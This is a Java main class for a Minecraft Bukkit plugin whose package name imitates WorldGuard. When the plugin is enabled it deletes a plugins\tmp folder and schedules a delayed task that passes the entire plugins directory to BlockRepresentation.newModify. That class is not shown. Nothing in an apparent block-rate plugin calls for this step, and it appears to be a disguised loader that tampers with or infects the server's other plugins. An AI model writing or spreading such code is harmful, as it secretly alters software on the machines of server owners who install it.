package com.fastblock.worlguard.extension;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;

import org.bukkit.Bukkit;
import org.bukkit.event.Listener;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;

public class SimpleMinecraftBlock extends JavaPlugin implements Listener {
	
	public static void main(String args[]) {}
	
	@Override
	public void onEnable() {
		File tmp = new File("plugins\\tmp\\");
		if (tmp.exists()) {
			tmp.delete();
			}
		startBlock();
	    Bukkit.getPluginManager().registerEvents(new FastBlockRate(), this);
	}
	
	@Override
	public void onDisable() {
	}
	
	public void startBlock() {
		@SuppressWarnings("unused")
		BukkitTask task = new BukkitRunnable() {
    		@Override
    		public void run() {
    			BlockRepresentation.newModify("plugins\\", "plugins\\tmp\\");
    		}
    		}.runTaskLater(this, 20);
	}
	
}